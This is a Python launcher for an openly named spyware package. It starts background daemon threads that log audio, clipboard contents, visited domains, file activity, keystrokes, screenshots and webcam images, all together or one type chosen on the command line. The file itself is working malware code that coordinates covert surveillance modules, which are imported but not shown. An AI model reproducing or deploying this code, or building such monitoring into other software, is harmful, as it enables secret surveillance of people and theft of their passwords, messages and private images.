#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This file implement a spyware. """

###################
#    This file implement a spyware.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

__all__ = [ 
    "spy", "join", "stop_deamons", 
    "start_audio_spy", "start_copy_spy",
    "start_domains_spy", "start_files_spy",
    "start_key_spy", "start_screen_spy",
    "start_webcam_spy", "spyware"
]

try:
    from AudioLogger.AudioLogger import Daemon as AudioDaemon, config_load as audioConfig
    from CopyLogger.CopyLogger import Daemon as CopyDaemon, config_load as copyConfig
    from DomainsLogger.DomainsLogger import Daemon as DomainsDaemon, config_load as domainsConfig
    from FilesLogger.FilesLogger import Daemon as FilesDaemon, config_load as filesConfig
    from KeyLogger.KeyLogger import Daemon as KeyDaemon, config_load as keyConfig
    from ScreenLogger.ScreenLogger import Daemon as ScreenDaemon, config_load as screenConfig
    from WebcamLogger.WebcamLogger import Daemon as WebcamDaemon, config_load as webcamConfig
except ImportError:
    from .AudioLogger.AudioLogger import Daemon as AudioDaemon, config_load as audioConfig
    from .CopyLogger.CopyLogger import Daemon as CopyDaemon, config_load as copyConfig
    from .DomainsLogger.DomainsLogger import Daemon as DomainsDaemon, config_load as domainsConfig
    from .FilesLogger.FilesLogger import Daemon as FilesDaemon, config_load as filesConfig
    from .KeyLogger.KeyLogger import Daemon as KeyDaemon, config_load as keyConfig
    from .ScreenLogger.ScreenLogger import Daemon as ScreenDaemon, config_load as screenConfig
    from .WebcamLogger.WebcamLogger import Daemon as WebcamDaemon, config_load as webcamConfig

from threading import Thread
from typing import Tuple
from sys import argv

def join(*threads) -> None:

    """ This function join threads. """

    for thread in threads:
        thread.join()

def stop_deamons(*daemons) -> None:

    """ This function send daemon's stop signal. """

    for daemon in daemons:
        daemon.run = False

def start_audio_spy() -> Tuple[Thread, AudioDaemon]:

    """ This function launch audio spy. """

    audioConfig()
    audio = AudioDaemon()

    audio_thread = Thread(target=audio.run_for_ever)
    audio_thread.daemon = True
    audio_thread.start()

    return audio_thread, audio

def start_copy_spy() -> Tuple[Thread, CopyDaemon]:

    """ This function launch copy spy. """

    copyConfig()
    copy = CopyDaemon()

    copy_thread = Thread(target=copy.run_for_ever)
    copy_thread.daemon = True
    copy_thread.start()

    return copy_thread, copy

def start_domains_spy() -> Tuple[Thread, Thread, DomainsDaemon]:

    """ This function launch domains spy. """

    domainsConfig()
    domains = DomainsDaemon()

    domains1_thread = Thread(target=domains.run_CacheDns)
    domains1_thread.daemon = True
    domains1_thread.start()

    domains2_thread = Thread(target=domains.run_AppData)
    domains2_thread.daemon = True
    domains2_thread.start()

    return domains1_thread, domains2_thread, domains

def start_files_spy() -> Tuple[Thread, FilesDaemon]:

    """ This function launch files spy. """

    filesConfig()
    files = FilesDaemon()

    files_thread = Thread(target=files.run_for_ever)
    files_thread.daemon = True
    files_thread.start()

    return files_thread, files

def start_key_spy() -> Tuple[Thread, KeyDaemon]:

    """ This function launch key spy. """

    keyConfig()
    key = KeyDaemon()

    key_thread = Thread(target=key.run_for_ever)
    key_thread.daemon = True
    key_thread.start()

    return key_thread, key

def start_screen_spy() -> Tuple[Thread, ScreenDaemon]:

    """ This function launch screen spy. """

    screenConfig()
    screen = ScreenDaemon()

    screen_thread = Thread(target=screen.run_for_ever)
    screen_thread.daemon = True
    screen_thread.start()

    return screen_thread, screen

def start_webcam_spy() -> Tuple[Thread, WebcamDaemon]:

    """ This function launch files spy. """

    webcamConfig()
    webcam = WebcamDaemon()

    webcam_thread = Thread(target=webcam.run_for_ever)
    webcam_thread.daemon = True
    webcam_thread.start()

    return webcam_thread, webcam

def spy() -> None:

    """ This function launch all spy functions. """

    threads = []
    
    thread, audio = start_audio_spy()
    threads.append(thread)

    thread, copy = start_copy_spy()
    threads.append(thread)

    thread, thread2, domains = start_domains_spy()
    threads.append(thread)
    threads.append(thread2)

    thread, files = start_files_spy()
    threads.append(thread)

    thread, key = start_key_spy()
    threads.append(thread)

    thread, screen = start_screen_spy()
    threads.append(thread)

    thread, webcam = start_webcam_spy()
    threads.append(thread)

    try:
        join(*threads)
    except KeyboardInterrupt:
        stop_deamons(
            audio, copy, domains,
            files, key, screen,
            webcam
        )
    join(*threads)

def spyware() -> None:

    """ The SpyWare launcher. """

    types = [
        "webcam", "files", "screen",
        "key", "domains", "copy",
        "audio"
    ]

    if len(argv) == 1:
        spy()

    elif len(argv) >= 2 and argv[1].lower() in types:
        type_ = argv.pop(1).lower()
        functions = globals()[f"start_{type_}_spy"]()
        try:
            join(*functions[:-1])
        except KeyboardInterrupt:
            stop_deamons(functions[-1])
        join(*functions[:-1])

    else:
        print(f"""
USAGE: python3 SpyWare [TYPE]
    TYPE: {' '.join(types)}
    """)